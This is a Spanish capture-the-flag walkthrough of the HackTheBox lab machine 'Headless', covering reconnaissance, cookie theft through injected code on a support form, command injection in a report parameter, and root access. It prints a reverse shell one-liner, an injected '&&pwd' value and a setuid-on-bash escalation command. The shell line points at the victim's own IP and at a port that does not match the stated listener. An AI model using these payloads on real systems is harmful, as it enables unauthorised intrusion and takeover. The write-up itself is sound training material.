---
title: Headless
layout: default
parent: HackTheBox
---

# Headless
{:.no_toc}

---

1. List
{:toc}

---

## Reconocimiento
&nbsp;

La máquina tiene la IP 10.10.11.8, procedemos a escanearla con nmap, primero comprobando que tenemos conexión con:

```bash
nmap 10.10.11.8 -sn
```

Y podemos ver que esta en línea.

![](/assets/images/Imagenes/Pasted image 20240615182604.png)
&nbsp;

Ahora haremos un escaneo mas profundo de los puertos TCP que tiene abiertos para recabar mas información. Además le diremos que nos vaya informando sobre lo que vaya encontrando, evitando la resolución de nombres y descubrimiento de hosts, todo en un archivo grepeable llamado **allPorts**.

```bash
sudo nmap -p- -sS --open --min-rate 5000 10.10.11.8 -vvv -n -Pn -oG allports
```
&nbsp;

Con esto nos descubre dos puertos, el 22 (SSH) y el 5000 que segun el escaneo nos muestra que es upnp (Universal Plug and Play).

![](/assets/images/Imagenes/Pasted image 20240615183049.png)
&nbsp;

Al intentar entrar desde el navegador nos muestra una página:

![](/assets/images/Imagenes/Pasted image 20240615183112.png)
&nbsp;

Si pulsamos nos lleva a una página de contacto:

![](/assets/images/Imagenes/Pasted image 20240615183138.png)
&nbsp;

Al no ver nada mas interesante pruebo con un escaneo de directorios con gobuster.

```bash
gobuster dir -u http://10.10.11.8:5000/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,txt
```
&nbsp;

Veo que ademas de support encuentra el directorio dashboard

![](/assets/images/Imagenes/Pasted image 20240615185227.png)
&nbsp;

Al intentar entrar nos dice que no tenemos las credenciales necesarias:

![](/assets/images/Imagenes/Pasted image 20240615185305.png)
&nbsp;

En las cookies podemos ver que están guardados los datos de administrador:

![](/assets/images/Imagenes/Pasted image 20240615190453.png)
&nbsp;

## Explotación
&nbsp;

A partir de este punto recurro a una WT, en donde se muestra que a través de inyección de código se puede llegar a ver la cookie de administrador interceptando la petición de la página support con burpsuit.

![](/assets/images/Imagenes/Pasted image 20240615191411.png)
&nbsp;

Con esto conseguimos que nos muestre la cookie montando antes un servidor python en nuestra maquina para que nos llegue la petición.

![](/assets/images/Imagenes/Pasted image 20240615191451.png)
&nbsp;

Al cambiar la cookie podremos acceder a otro panel de administrador.

![](/assets/images/Imagenes/Pasted image 20240615191603.png)
&nbsp;

Parece ser que se generan reportes, por lo que miramos con burpsuit como es la petición.

En la petición se envía una variable con el valor del día introducido. Si probamos a inyectar código para sacar por ejemplo el directorio actual de la pagina añadiendo **%26%26pwd** nos muestra que estamos en **/home/dvir/app**, por lo que es capaz de interpretar código a través de la variable.

Con esto podemos crear una reverse shell para ganar acceso a la maquina, haciendo que la maquina victima busque un recurso en el que hayamos introducido la reverse shell.

```bash
shell.sh 

/bin/sh -i >& /dev/tcp/10.10.11.8/443 0>&1
```
&nbsp;

Además le daremos permisos para ejecución.

El siguiente paso es importante tener el servidor de python o de cualquier tipo para que a la hora de la inyección que la maquina vulnerable acceda al recurso pueda acceder a el y ejecutarlo.

Para ello nos pondremos en escucha por el puerto 1234 con netcat y en la petición le pediremos que acceda al recurso shell.sh.

![](/assets/images/Imagenes/Pasted image 20240615194441.png)\

![](/assets/images/Imagenes/Pasted image 20240615194456.png)

Con esto ya estaráamos dentro de la máquina. La bandera de usuario estará en el directorio principal.

## Escalada de privilegios
&nbsp;

![](/assets/images/Imagenes/Pasted image 20240615194550.png)

Para la escalada de privilegios crearemos un archivo con:

```bash
echo "chmod u+s /bin/bash" > hack.sh
bash-5.2$ chmod +x hack.sh
chmod +x hack.sh
```
&nbsp;

Con esto crearemos un script que al ejecutarse otorgara el bit de setuid al binario **/bin/bash**, y ejecutar comandos como usuario root.

Al ejecutar el binario ya tendremos privilegios de superusuario:

![](/assets/images/Imagenes/Pasted image 20240615200154.png)
&nbsp;

Una vez dentro podemos buscar en el directorio root donde estará la bandera de root.